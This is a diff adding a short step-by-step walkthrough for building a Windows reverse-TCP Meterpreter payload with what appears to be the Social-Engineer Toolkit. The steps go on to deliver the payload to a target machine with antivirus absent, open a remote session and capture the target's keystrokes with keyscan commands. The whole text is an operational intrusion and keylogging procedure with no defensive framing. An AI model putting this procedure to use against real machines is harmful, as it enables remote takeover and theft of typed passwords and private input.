@@ -1,0 +1,28 @@
+1. 1) Social Engineering Attacks 
+
+2. 4) Create a Payload and Listener
+        - Payload = virus, worm, or Trojan which contains instructions on what to do on a victim’s computer.
+
+3. 2) Windows Reverse_TCP Meterpreter
+
+4. Enter IP Address of Host and choose Random Port
+
+5. When hit enter, the payload will be generated and exported to SET directory at /root/.set/payload.exe
+
+6. Right click on the payload.exe file, click on properties, on permissions make sure to check “Allow executing file as program”
+
+7. Back at the terminal, it is prompting to start the payload. Type yes
+
+8. Copy the payload.exe over to the target machine and make sure the target machine does not have anti-virus software running or else it will get deleted
+
+9. Run the payload.exe on the target machine.
+
+10. After running it, go back to the Kali Linux terminal and a session will be starting. Use “sessions -i 1” command to start interacting with the session.
+
+11. Now that our Kali Linux have a session on the target machine, it is possible to run commands like “sysinfo”
+
+12. Run “keyscan_start” to start collecting the target machine’s keystroke.
+
+13. run the command “keyscan_dump” to display what the target machine have typed.
+
+14. Stop the key scanner by running the command “keyscan_stop”
